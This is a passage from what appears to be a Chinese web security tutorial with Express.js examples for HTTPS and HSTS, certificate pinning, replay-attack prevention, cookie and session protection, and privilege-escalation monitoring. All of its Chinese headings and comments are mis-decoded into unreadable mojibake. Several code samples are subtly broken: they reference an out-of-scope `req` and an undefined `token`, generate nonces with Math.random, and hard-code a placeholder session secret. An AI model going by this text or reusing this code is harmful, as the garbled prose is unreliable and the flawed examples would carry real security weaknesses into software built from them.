  // æ£€æŸ¥æ˜¯å¦ä½¿ç”¨HTTPS
  if (req.header('x-forwarded-proto') !== 'https') {
    // é‡å®šå‘åˆ°HTTPSç‰ˆæœ¬
    return res.redirect(`https://${req.header('host')}${req.url}`);
  }
  next();
});

// è®¾ç½®HTTPSç›¸å…³å®‰å…¨å¤´
app.use((req, res, next) => {
  // å¼ºåˆ¶ä½¿ç”¨HTTPS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  
  // é˜²æ­¢å†…å®¹ç±»å‹å—…æ¢
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // é˜²æ­¢ç‚¹å‡»åŠ«æŒ
  res.setHeader('X-Frame-Options', 'DENY');
  
  next();
});
```

## 5.3 è¯ä¹¦é”å®šï¼ˆCertificate Pinningï¼‰



**ğŸ¯ è¯ä¹¦é”å®šåŸç†**
å°±åƒä½ åªè®¤è¯†ç‰¹å®šé“¶è¡Œå·¥ä½œäººå‘˜çš„è„¸ï¼Œç½‘ç«™ä¹Ÿå¯ä»¥åªä¿¡ä»»ç‰¹å®šçš„è¯ä¹¦ã€‚

```javascript
// å®¢æˆ·ç«¯è¯ä¹¦é”å®šç¤ºä¾‹ï¼ˆç§»åŠ¨åº”ç”¨ï¼‰
const trustedCertificates = [
  'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=', // ä¸»è¯ä¹¦
  'sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB='  // å¤‡ç”¨è¯ä¹¦
];

function validateCertificate(serverCertificate) {
  const certHash = sha256(serverCertificate);
  
  if (!trustedCertificates.includes(certHash)) {
    throw new Error('è¯ä¹¦ä¸å—ä¿¡ä»»ï¼Œå¯èƒ½å­˜åœ¨ä¸­é—´äººæ”»å‡»');
  }
  
  return true;
}
```

## 5.4 HSTSå®‰å…¨ç­–ç•¥



**ğŸ’¡ HSTSå·¥ä½œåŸç†**
HSTSå‘Šè¯‰æµè§ˆå™¨"ä»¥åè®¿é—®æˆ‘åªç”¨HTTPSï¼Œä¸è¦ç”¨HTTP"ã€‚

```javascript
// HSTSé…ç½®
app.use((req, res, next) => {
  // è®¾ç½®HSTSå¤´
  res.setHeader('Strict-Transport-Security', 
    'max-age=31536000; includeSubDomains; preload');
  next();
});
```

**HSTSç­–ç•¥è§£é‡Š**ï¼š
- **max-age=31536000** - 1å¹´å†…å¼ºåˆ¶ä½¿ç”¨HTTPS
- **includeSubDomains** - æ‰€æœ‰å­åŸŸåä¹Ÿå¼ºåˆ¶HTTPS
- **preload** - ç”³è¯·åŠ å…¥æµè§ˆå™¨HSTSé¢„è½½åˆ—è¡¨

## 5.5 å…¬é’¥é”å®šï¼ˆPublic Key Pinningï¼‰



**ğŸ”§ å…¬é’¥é”å®šé…ç½®**
```javascript
// HTTP Public Key Pinning (HPKP)
app.use((req, res, next) => {
  res.setHeader('Public-Key-Pins', 
    'pin-sha256="å…¬é’¥å“ˆå¸Œ1"; pin-sha256="å…¬é’¥å“ˆå¸Œ2"; max-age=2592000'
  );
  next();
});
```

**âš ï¸ æ³¨æ„äº‹é¡¹**ï¼š
- **æ…é‡ä½¿ç”¨** - é…ç½®é”™è¯¯å¯èƒ½å¯¼è‡´ç½‘ç«™æ— æ³•è®¿é—®
- **å¤‡ç”¨å…¬é’¥** - å¿…é¡»é…ç½®å¤‡ç”¨å…¬é’¥é˜²æ­¢è¯ä¹¦æ›´æ–°é—®é¢˜
- **é€æ­¥æ·˜æ±°** - ç°ä»£æµè§ˆå™¨æ›´æ¨èè¯ä¹¦é€æ˜åº¦ï¼ˆCTï¼‰

---

# 6. ğŸ”„ é‡æ”¾æ”»å‡»é˜²æŠ¤



## 6.1 ä»€ä¹ˆæ˜¯é‡æ”¾æ”»å‡»



**ğŸ¯ ç®€å•ç†è§£**
é‡æ”¾æ”»å‡»å°±åƒå½•éŸ³æœºæŠŠä½ çš„è¯å½•ä¸‹æ¥ï¼Œç„¶åé‡å¤æ’­æ”¾ã€‚é»‘å®¢æˆªè·ä½ çš„ç½‘ç»œè¯·æ±‚ï¼Œç„¶åé‡å¤å‘é€æ¥å†’å……ä½ ã€‚

```
æ”»å‡»è¿‡ç¨‹ï¼š
1. ç”¨æˆ·å‘é€ï¼šè½¬è´¦1000å…ƒç»™å¼ ä¸‰
2. é»‘å®¢æˆªè·è¿™ä¸ªè¯·æ±‚
3. é»‘å®¢é‡æ”¾10æ¬¡ç›¸åŒè¯·æ±‚
4. ç»“æœï¼šè½¬è´¦10000å…ƒç»™å¼ ä¸‰
```

## 6.2 æ—¶é—´æˆ³é˜²æŠ¤



**ğŸ’¡ æ—¶é—´çª—å£éªŒè¯**
```javascript
// æ—¶é—´æˆ³éªŒè¯
function validateTimestamp(requestTimestamp, windowSeconds = 300) {
  const now = Date.now();
  const requestTime = new Date(requestTimestamp).getTime();
  const timeDiff = Math.abs(now - requestTime) / 1000;
  
  if (timeDiff > windowSeconds) {
    throw new Error('è¯·æ±‚å·²è¿‡æœŸï¼Œå¯èƒ½å­˜åœ¨é‡æ”¾æ”»å‡»');
  }
  
  return true;
}

// APIè¯·æ±‚ç¤ºä¾‹
app.post('/transfer', (req, res) => {
  const { amount, target, timestamp } = req.body;
  
  try {
    // éªŒè¯æ—¶é—´æˆ³ï¼ˆ5åˆ†é’Ÿæœ‰æ•ˆæœŸï¼‰
    validateTimestamp(timestamp, 300);
    
    // å¤„ç†è½¬è´¦
    processTransfer(req.user.id, target, amount);
    res.json({ success: true });
    
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});
```

## 6.3 éšæœºæ•°ï¼ˆNonceï¼‰é˜²æŠ¤



**ğŸ¯ éšæœºæ•°åŸç†**
æ¯ä¸ªè¯·æ±‚éƒ½åŒ…å«ä¸€ä¸ªå”¯ä¸€çš„éšæœºæ•°ï¼ŒæœåŠ¡å™¨è®°å½•ç”¨è¿‡çš„éšæœºæ•°ï¼Œé‡å¤çš„è¯·æ±‚ä¼šè¢«æ‹’ç»ã€‚

```javascript
// éšæœºæ•°é˜²é‡æ”¾
const usedNonces = new Set(); // å®é™…åº”ç”¨ä¸­åº”ä½¿ç”¨Redisç­‰æŒä¹…åŒ–å­˜å‚¨

function generateNonce() {
  return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

function validateNonce(nonce) {
  if (usedNonces.has(nonce)) {
    throw new Error('è¯·æ±‚é‡å¤ï¼Œå¯èƒ½å­˜åœ¨é‡æ”¾æ”»å‡»');
  }
  
  usedNonces.add(nonce);
  
  // å®šæœŸæ¸…ç†è¿‡æœŸçš„nonceï¼ˆé¿å…å†…å­˜æ³„æ¼ï¼‰
  setTimeout(() => {
    usedNonces.delete(nonce);
  }, 5 * 60 * 1000); // 5åˆ†é’Ÿåæ¸…ç†
  
  return true;
}

// å®¢æˆ·ç«¯ç”Ÿæˆè¯·æ±‚
function createSecureRequest(data) {
  const nonce = generateNonce();
  const timestamp = new Date().toISOString();
  
  return {
    ...data,
    nonce,
    timestamp
  };
}
```

## 6.4 ä¸€æ¬¡æ€§ä»¤ç‰Œé˜²æŠ¤



**ğŸ’¡ ä¸€æ¬¡æ€§Tokenæœºåˆ¶**
```javascript
// ä¸€æ¬¡æ€§æ“ä½œä»¤ç‰Œ
const operationTokens = new Map();

// ç”Ÿæˆæ“ä½œä»¤ç‰Œ
app.post('/generate-transfer-token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  const userId = req.user.id;
  
  // ä»¤ç‰Œ5åˆ†é’Ÿæœ‰æ•ˆ
  operationTokens.set(token, {
    userId,
    expiresAt: Date.now() + 5 * 60 * 1000,
    used: false
  });
  
  res.json({ token });
});

// ä½¿ç”¨ä»¤ç‰Œæ‰§è¡Œè½¬è´¦
app.post('/transfer-with-token', (req, res) => {
  const { token, amount, target } = req.body;
  const tokenData = operationTokens.get(token);
  
  if (!tokenData) {
    return res.status(400).json({ error: 'æ— æ•ˆçš„æ“ä½œä»¤ç‰Œ' });
  }
  
  if (tokenData.used) {
    return res.status(400).json({ error: 'ä»¤ç‰Œå·²è¢«ä½¿ç”¨' });
  }
  
  if (Date.now() > tokenData.expiresAt) {
    return res.status(400).json({ error: 'ä»¤ç‰Œå·²è¿‡æœŸ' });
  }
  
  if (tokenData.userId !== req.user.id) {
    return res.status(403).json({ error: 'ä»¤ç‰Œä¸å±äºå½“å‰ç”¨æˆ·' });
  }
  
  // æ ‡è®°ä»¤ç‰Œä¸ºå·²ä½¿ç”¨
  tokenData.used = true;
  
  // æ‰§è¡Œè½¬è´¦
  processTransfer(req.user.id, target, amount);
  res.json({ success: true });
});
```

## 6.5 åºåˆ—å·æœºåˆ¶



**ğŸ”¢ è¯·æ±‚åºåˆ—å·**
```javascript
// ç”¨æˆ·ä¼šè¯åºåˆ—å·ç®¡ç†
const userSequences = new Map();

function initUserSequence(userId) {
  if (!userSequences.has(userId)) {
    userSequences.set(userId, 0);
  }
}

function validateSequence(userId, sequence) {
  const expectedSequence = userSequences.get(userId) + 1;
  
  if (sequence !== expectedSequence) {
    throw new Error(`åºåˆ—å·é”™è¯¯ï¼ŒæœŸæœ› ${expectedSequence}ï¼Œæ”¶åˆ° ${sequence}`);
  }
  
  // æ›´æ–°åºåˆ—å·
  userSequences.set(userId, sequence);
  return true;
}

// APIä½¿ç”¨åºåˆ—å·
app.post('/secure-operation', (req, res) => {
  const { sequence, operation } = req.body;
  const userId = req.user.id;
  
  try {
    initUserSequence(userId);
    validateSequence(userId, sequence);
    
    // æ‰§è¡Œæ“ä½œ
    performOperation(operation);
    res.json({ success: true, nextSequence: sequence + 1 });
    
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});
```

---

# 7. ğŸª ä¼šè¯åŠ«æŒé˜²æŠ¤



## 7.1 ä»€ä¹ˆæ˜¯ä¼šè¯åŠ«æŒ



**ğŸ¯ ç®€å•ç†è§£**
ä¼šè¯åŠ«æŒå°±åƒæœ‰äººå·äº†ä½ çš„é—¨å¡ï¼Œç„¶åå†’å……ä½ è¿›å‡ºå¤§æ¥¼ã€‚é»‘å®¢è·å–ä½ çš„ä¼šè¯æ ‡è¯†ï¼ˆå¦‚Cookieï¼‰ï¼Œå°±èƒ½å†’å……ä½ çš„èº«ä»½è®¿é—®ç³»ç»Ÿã€‚

```
ä¼šè¯åŠ«æŒè¿‡ç¨‹ï¼š
1. ç”¨æˆ·æ­£å¸¸ç™»å½• â†’ è·å¾—ä¼šè¯Cookie
2. é»‘å®¢é€šè¿‡å„ç§æ–¹å¼è·å–Cookie
3. é»‘å®¢ä½¿ç”¨Cookie â†’ å†’å……ç”¨æˆ·èº«ä»½
4. ç³»ç»Ÿè®¤ä¸ºæ˜¯åˆæ³•ç”¨æˆ· â†’ å…è®¸æ“ä½œ
```

**å¸¸è§åŠ«æŒæ–¹å¼**ï¼š
- **ç½‘ç»œç›‘å¬** - ä¸å®‰å…¨ç½‘ç»œä¸­æŠ“åŒ…è·å–Cookie
- **XSSæ”»å‡»** - æ¶æ„è„šæœ¬è¯»å–Cookie
- **ç‰©ç†è®¿é—®** - ç›´æ¥ä»ç”¨æˆ·è®¾å¤‡è·å–
- **ä¸­é—´äººæ”»å‡»** - æ‹¦æˆªä¼ è¾“ä¸­çš„Cookie

## 7.2 HttpOnlyå±æ€§é˜²æŠ¤



**ğŸ’¡ HttpOnlyä½œç”¨**
HttpOnlyå°±åƒç»™Cookieä¸Šäº†ä¸€æŠŠé”ï¼Œåªæœ‰æœåŠ¡å™¨èƒ½è¯»å–ï¼ŒJavaScriptæ— æ³•è®¿é—®ã€‚

```javascript
// è®¾ç½®HttpOnly Cookie
app.post('/login', (req, res) => {
  if (validateUser(req.body.username, req.body.password)) {
    const sessionId = generateSessionId();
    
    // è®¾ç½®HttpOnly Cookieï¼Œé˜²æ­¢XSSæ”»å‡»è¯»å–
    res.cookie('sessionId', sessionId, {
      httpOnly: true,      // é˜²æ­¢JavaScriptè®¿é—®
      secure: true,        // åªåœ¨HTTPSä¸‹ä¼ è¾“
      sameSite: 'strict',  // é˜²æ­¢CSRFæ”»å‡»
      maxAge: 30 * 60 * 1000  // 30åˆ†é’Ÿè¿‡æœŸ
    });
    
    res.json({ success: true });
  }
});

// âŒ é”™è¯¯æ–¹å¼ï¼šJavaScriptå¯ä»¥è®¿é—®
document.cookie = "sessionId=abc123";
console.log(document.cookie); // èƒ½è¯»åˆ°sessionId

// âœ… æ­£ç¡®æ–¹å¼ï¼šHttpOnly Cookie
// JavaScriptæ— æ³•è¯»å–HttpOnly Cookie
console.log(document.cookie); // è¯»ä¸åˆ°sessionId
```

## 7.3 Secureå±æ€§é˜²æŠ¤



**ğŸ” Secureå±æ€§è¯´æ˜**
Secureå±æ€§ç¡®ä¿Cookieåªåœ¨HTTPSè¿æ¥ä¸‹ä¼ è¾“ï¼Œé˜²æ­¢ç½‘ç»œç›‘å¬ã€‚

```javascript
// Cookieå®‰å…¨é…ç½®
const cookieConfig = {
  httpOnly: true,    // é˜²æ­¢XSS
  secure: true,      // åªåœ¨HTTPSä¼ è¾“
  sameSite: 'strict', // é˜²æ­¢CSRF
  domain: '.example.com', // é™åˆ¶åŸŸå
  path: '/',         // é™åˆ¶è·¯å¾„
  maxAge: 30 * 60 * 1000 // 30åˆ†é’Ÿè¿‡æœŸ
};

// ç”Ÿäº§ç¯å¢ƒCookieè®¾ç½®
app.use(session({
  secret: 'your-secret-key',
  cookie: cookieConfig,
  resave: false,
  saveUninitialized: false
}));
```

## 7.4 SameSiteå±æ€§é˜²æŠ¤



**ğŸ¯ SameSiteå·¥ä½œåŸç†**
SameSiteæ§åˆ¶Cookieåœ¨è·¨ç«™è¯·æ±‚ä¸­çš„è¡Œä¸ºï¼Œé˜²æ­¢CSRFæ”»å‡»ã€‚

```javascript
// SameSiteå±æ€§è¯´æ˜
const sameSiteOptions = {
  'Strict': 'æœ€ä¸¥æ ¼ï¼Œå®Œå…¨ç¦æ­¢è·¨ç«™å‘é€',
  'Lax': 'é»˜è®¤å€¼ï¼Œå¤§å¤šæ•°è·¨ç«™è¯·æ±‚ä¸å‘é€ï¼Œå¯¼èˆªè¯·æ±‚ä¼šå‘é€', 
  'None': 'å…è®¸è·¨ç«™å‘é€ï¼Œå¿…é¡»é…åˆSecureä½¿ç”¨'
};

// æ ¹æ®åœºæ™¯é€‰æ‹©SameSite
app.use((req, res, next) => {
  if (req.path.startsWith('/api/')) {
    // APIæ¥å£ä½¿ç”¨ä¸¥æ ¼æ¨¡å¼
    res.cookie('api-token', token, { sameSite: 'strict' });
  } else if (req.path.startsWith('/embed/')) {
    // åµŒå…¥é¡µé¢éœ€è¦è·¨ç«™è®¿é—®
    res.cookie('embed-session', sessionId, { 
      sameSite: 'none', 
      secure: true 
    });
  }
  next();
});
```

## 7.5 Tokenè½®æ¢æœºåˆ¶



**ğŸ”„ å®šæœŸæ›´æ¢ä¼šè¯æ ‡è¯†**
```javascript
// ä¼šè¯Tokenè½®æ¢
const activeTokens = new Map(); // å­˜å‚¨æ´»è·ƒçš„Token

function rotateToken(oldToken) {
  const tokenData = activeTokens.get(oldToken);
  
  if (!tokenData) {
    throw new Error('æ— æ•ˆçš„Token');
  }
  
  // ç”Ÿæˆæ–°Token
  const newToken = crypto.randomBytes(32).toString('hex');
  
  // æ›´æ–°Tokenæ•°æ®
  activeTokens.set(newToken, {
    ...tokenData,
    createdAt: Date.now(),
    rotatedFrom: oldToken
  });
  
  // ä¿ç•™æ—§Tokenä¸€å°æ®µæ—¶é—´ï¼ˆé˜²æ­¢ç½‘ç»œå»¶è¿Ÿå¯¼è‡´çš„é—®é¢˜ï¼‰
  setTimeout(() => {
    activeTokens.delete(oldToken);
  }, 60 * 1000); // 1åˆ†é’Ÿååˆ é™¤æ—§Token
  
  return newToken;
}

// å®šæœŸè½®æ¢Token
app.post('/rotate-session', (req, res) => {
  const currentToken = req.cookies.sessionId;
  
  try {
    const newToken = rotateToken(currentToken);
    
    res.cookie('sessionId', newToken, cookieConfig);
    res.json({ success: true, rotated: true });
    
  } catch (error) {
    res.status(401).json({ error: 'éœ€è¦é‡æ–°ç™»å½•' });
  }
});

// è‡ªåŠ¨è½®æ¢ä¸­é—´ä»¶
app.use((req, res, next) => {
  const sessionToken = req.cookies.sessionId;
  const tokenData = activeTokens.get(sessionToken);
  
  if (tokenData) {
    const tokenAge = Date.now() - tokenData.createdAt;
    
    // Tokenä½¿ç”¨è¶…è¿‡15åˆ†é’Ÿè‡ªåŠ¨è½®æ¢
    if (tokenAge > 15 * 60 * 1000) {
      const newToken = rotateToken(sessionToken);
      res.cookie('sessionId', newToken, cookieConfig);
    }
  }
  
  next();
});
```

---

# 8. â¬†ï¸ æƒé™æå‡é˜²æŠ¤



## 8.1 ä»€ä¹ˆæ˜¯æƒé™æå‡æ”»å‡»



**ğŸ¯ ç®€å•ç†è§£**
æƒé™æå‡æ”»å‡»å°±åƒä¸´æ—¶å·¥æƒ³åŠæ³•è·å¾—ç»ç†çš„æƒé™ã€‚æ”»å‡»è€…åˆ©ç”¨ç³»ç»Ÿæ¼æ´æˆ–è®¾è®¡ç¼ºé™·ï¼Œè·å¾—è¶…å‡ºè‡ªå·±åº”æœ‰çš„æƒé™ã€‚

```
æ”»å‡»ç¤ºä¾‹ï¼š
æ™®é€šç”¨æˆ· â†’ ä¿®æ”¹URLå‚æ•° â†’ è®¿é—®ç®¡ç†å‘˜åŠŸèƒ½
user/profile?userId=123 â†’ admin/users?userId=123
```

**å¸¸è§æƒé™æå‡åœºæ™¯**ï¼š
- **å‚ç›´æå‡** - æ™®é€šç”¨æˆ·è·å¾—ç®¡ç†å‘˜æƒé™
- **æ°´å¹³æå‡** - ç”¨æˆ·Aè®¿é—®ç”¨æˆ·Bçš„æ•°æ®
- **åŠŸèƒ½æå‡** - è¯»æƒé™æå‡ä¸ºå†™æƒé™

## 8.2 æœ€å°æƒé™åŸåˆ™



**ğŸ’¡ æƒé™æœ€å°åŒ–è®¾è®¡**
```javascript
// ç”¨æˆ·æƒé™æ¨¡å‹
const userRoles = {
  'guest': ['read:public'],
  'user': ['read:public', 'read:own', 'write:own'],
  'admin': ['read:*', 'write:*', 'delete:*'],
  'superadmin': ['*']
};

// æƒé™æ£€æŸ¥ä¸­é—´ä»¶
function requirePermission(permission) {
  return (req, res, next) => {
    const userRole = req.user?.role || 'guest';
    const userPermissions = userRoles[userRole] || [];
    
    const hasPermission = userPermissions.some(p => {
      // é€šé…ç¬¦åŒ¹é…
      if (p === '*') return true;
      if (p.endsWith(':*') && permission.startsWith(p.slice(0, -1))) return true;
      return p === permission;
    });
    
    if (!hasPermission) {
      return res.status(403).json({ 
        error: 'æƒé™ä¸è¶³',
        required: permission,
        current: userPermissions 
      });
    }
    
    next();
  };
}

// ä½¿ç”¨ç¤ºä¾‹
app.get('/admin/users', 
  requirePermission('read:users'),
  (req, res) => {
    // åªæœ‰æœ‰æƒé™çš„ç”¨æˆ·èƒ½è®¿é—®
    res.json(getAllUsers());
  }
);
```

## 8.3 æƒé™å®¡è®¡æœºåˆ¶



**ğŸ“Š æƒé™æ“ä½œè®°å½•**
```javascript
// æƒé™å®¡è®¡æ—¥å¿—
const auditLogger = {
  logPermissionCheck(userId, permission, granted, resource) {
    const auditRecord = {
      timestamp: new Date().toISOString(),
      userId,
      action: 'permission_check',
      permission,
      granted,
      resource,
      ip: req.ip,
      userAgent: req.get('User-Agent')
    };
    
    // è®°å½•åˆ°å®¡è®¡æ—¥å¿—
    console.log('AUDIT:', JSON.stringify(auditRecord));
    
    // æƒé™è¢«æ‹’ç»æ—¶ç‰¹åˆ«å…³æ³¨
    if (!granted) {
      this.alertSecurityTeam(auditRecord);
    }
  },
  
  logPrivilegeEscalation(userId, fromRole, toRole, grantedBy) {
    const escalationRecord = {
      timestamp: new Date().toISOString(),
      type: 'privilege_escalation',
      userId,
      fromRole,
      toRole,
      grantedBy,
      severity: 'HIGH'
    };
    
    console.log('SECURITY ALERT:', JSON.stringify(escalationRecord));
  }
};

// æƒé™æ£€æŸ¥å¢å¼ºç‰ˆ
function enhancedPermissionCheck(permission, resource) {
  return (req, res, next) => {
    const userId = req.user?.id;
    const hasPermission = checkUserPermission(userId, permission, resource);
    
    // è®°å½•æƒé™æ£€æŸ¥
    auditLogger.logPermissionCheck(userId, permission, hasPermission, resource);
    
    if (!hasPermission) {
      return res.status(403).json({ error: 'æƒé™ä¸è¶³' });
    }
    
    next();
  };
}
```

## 8.4 è¡Œä¸ºç›‘æ§ç³»ç»Ÿ



**ğŸ” å¼‚å¸¸è¡Œä¸ºæ£€æµ‹**
```javascript
// ç”¨æˆ·è¡Œä¸ºåˆ†æ
const behaviorMonitor = {
  // è®°å½•ç”¨æˆ·æ“ä½œ
  recordActivity(userId, action, resource, success) {
    const activity = {
      userId,
      action,
      resource,
      success,
      timestamp: Date.now(),
      ip: req.ip
    };
    
    this.analyzeActivity(activity);
  },
  
  // åˆ†æå¼‚å¸¸è¡Œä¸º
  analyzeActivity(activity) {
    const recentActivities = this.getUserRecentActivities(activity.userId, 3600); // æœ€è¿‘1å°æ—¶
    
    // æ£€æµ‹å¼‚å¸¸æ¨¡å¼
    const anomalies = [];
    
    // 1. æƒé™æ‹’ç»è¿‡å¤š
    const deniedCount = recentActivities.filter(a => !a.success).length;
    if (deniedCount > 10) {
      anomalies.push('é¢‘ç¹æƒé™è¢«æ‹’ç»');
    }
    
    // 2. è®¿é—®æ•æ„Ÿèµ„æº
    const sensitiveAccess = recentActivities.filter(a => 
      a.resource.includes('admin') || a.resource.includes('config')
    ).length;
    if (sensitiveAccess > 5) {
      anomalies.push('é¢‘ç¹è®¿é—®æ•æ„Ÿèµ„æº');
    }
    
    // 3. å¼‚å¸¸æ—¶é—´è®¿é—®
    const hour = new Date(activity.timestamp).getHours();
    if (hour < 6 || hour > 22) {
      anomalies.push('å¼‚å¸¸æ—¶é—´è®¿é—®');
    }
    
    if (anomalies.length > 0) {
      this.triggerSecurityAlert(activity.userId, anomalies);
    }
  },
  
  triggerSecurityAlert(userId, anomalies) {
    console.log(`ğŸš¨ å®‰å…¨è­¦æŠ¥ - ç”¨æˆ· ${userId}:`);
    anomalies.forEach(anomaly => console.log(`  - ${anomaly}`));
    
    // å¯ä»¥è§¦å‘è¿›ä¸€æ­¥çš„å®‰å…¨æªæ–½
    // å¦‚ï¼šä¸´æ—¶é”å®šè´¦æˆ·ã€è¦æ±‚é‡æ–°éªŒè¯èº«ä»½ç­‰
  }
};
```

## 8.5 å¼‚å¸¸å‘Šè­¦æœºåˆ¶



**âš ï¸ å®æ—¶å®‰å…¨å‘Šè­¦**
```javascript
// å®‰å…¨å‘Šè­¦ç³»ç»Ÿ
const securityAlerts = {
  // æƒé™å¼‚å¸¸å‘Šè­¦
  privilegeAnomalyAlert(userId, anomalyType, details) {
    const alert = {
      type: 'PRIVILEGE_ANOMALY',
      severity: 'HIGH',
      userId,
      anomalyType,
      details,
      timestamp: new Date().toISOString()
    };
    
    this.sendAlert(alert);
  },
  
  // å‘é€å‘Šè­¦
  async sendAlert(alert) {
    // 1. è®°å½•åˆ°å®‰å…¨æ—¥å¿—
    this.logSecurityEvent(alert);
    
    // 2. å®æ—¶é€šçŸ¥å®‰å…¨å›¢é˜Ÿ
    if (alert.severity === 'HIGH') {
      await this.notifySecurityTeam(alert);
    }
    
    // 3. è‡ªåŠ¨å“åº”æªæ–½
    await this.autoResponse(alert);
  },
  
  // è‡ªåŠ¨å“åº”
  async autoResponse(alert) {
    switch(alert.type) {
      case 'PRIVILEGE_ANOMALY':
        // ä¸´æ—¶é™ä½ç”¨æˆ·æƒé™
        await this.temporaryPrivilegeReduction(alert.userId);
        break;
        
      case 'BRUTE_FORCE_ATTACK':
        // é”å®šè´¦æˆ·
        await this.lockAccount(alert.userId, 30); // é”å®š30åˆ†é’Ÿ
        break;
        
      case 'SUSPICIOUS_ACCESS':
        // è¦æ±‚é‡æ–°éªŒè¯èº«ä»½
        await this.requireReAuthentication(alert.userId);
        break;
    }
  }
};

// é›†æˆåˆ°æƒé™æ£€æŸ¥ä¸­
function securePermissionCheck(permission) {
  return async (req, res, next) => {
    const userId = req.user?.id;
    const hasPermission = await checkPermission(userId, permission);
    
    if (!hasPermission) {
      // è®°å½•æƒé™è¢«æ‹’ç»
      securityAlerts.privilegeAnomalyAlert(userId, 'PERMISSION_DENIED', {
        requestedPermission: permission,
        currentPermissions: await getUserPermissions(userId),
        endpoint: req.path
      });
      
      return res.status(403).json({ error: 'æƒé™ä¸è¶³' });
    }
    
    next();
  };
}
```

---

# 9. ğŸ›¡ï¸ ç»¼åˆé˜²æŠ¤ç­–ç•¥



## 9.1 å¤šå±‚é˜²æŠ¤ä½“ç³»



**ğŸ° é˜²æŠ¤å±‚æ¬¡ç»“æ„**
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           ç”¨æˆ·æ•™è‚²å±‚                     â”‚ â† æé«˜å®‰å…¨æ„è¯†
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚           ç½‘ç»œä¼ è¾“å±‚                     â”‚ â† HTTPSã€è¯ä¹¦é”å®š
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚           åº”ç”¨ç½‘å…³å±‚                     â”‚ â† WAFã€APIç½‘å…³
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚           è®¤è¯æˆæƒå±‚                     â”‚ â† å¤šå› å­è®¤è¯ã€æƒé™æ§åˆ¶
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚           åº”ç”¨é€»è¾‘å±‚                     â”‚ â† è¾“å…¥éªŒè¯ã€ä¸šåŠ¡é€»è¾‘
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚           æ•°æ®è®¿é—®å±‚                     â”‚ â† SQLæ³¨å…¥é˜²æŠ¤ã€æ•°æ®åŠ å¯†
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚           åŸºç¡€è®¾æ–½å±‚                     â”‚ â† ç³»ç»Ÿå®‰å…¨ã€ç½‘ç»œéš”ç¦»
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## 9.2 é£é™©è¯„ä¼°çŸ©é˜µ



| æ”»å‡»ç±»å‹ | **å‘ç”Ÿæ¦‚ç‡** | **å½±å“ç¨‹åº¦** | **é£é™©ç­‰çº§** | **ä¼˜å…ˆçº§** |
|---------|-------------|-------------|-------------|-----------|
| **CSRFæ”»å‡»** | `ä¸­ç­‰` | `ä¸­ç­‰` | `ä¸­é£é™©` | `P2` |
| **XSSæ”»å‡»** | `é«˜` | `é«˜` | `é«˜é£é™©` | `P1` |
| **ä¼šè¯åŠ«æŒ** | `ä¸­ç­‰` | `é«˜` | `é«˜é£é™©` | `P1` |
| **æš´åŠ›ç ´è§£** | `é«˜` | `ä¸­ç­‰` | `ä¸­é£é™©` | `P2` |
| **æƒé™æå‡** | `ä½` | `é«˜` | `ä¸­é£é™©` | `P2` |
| **é‡æ”¾æ”»å‡»** | `ä¸­ç­‰` | `ä¸­ç­‰` | `ä¸­é£é™©` | `P3` |

## 9.3 å®‰å…¨é…ç½®æ¸…å•



**âœ… åŸºç¡€å®‰å…¨é…ç½®**
```javascript
// ç»¼åˆå®‰å…¨é…ç½®
const securityConfig = {
  // HTTPSé…ç½®
  https: {
    forceHttps: true,
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true
    }
  },
  
  // Cookieå®‰å…¨
  cookies: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000 // 30åˆ†é’Ÿ
  },
  
  // CORSé…ç½®
  cors: {
    origin: ['https://trusted-domain.com'],
    credentials: true,
    optionsSuccessStatus: 200
  },
  
  // å®‰å…¨å¤´è®¾ç½®
  securityHeaders: {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin'
  },
  
  // é™æµé…ç½®
  rateLimit: {
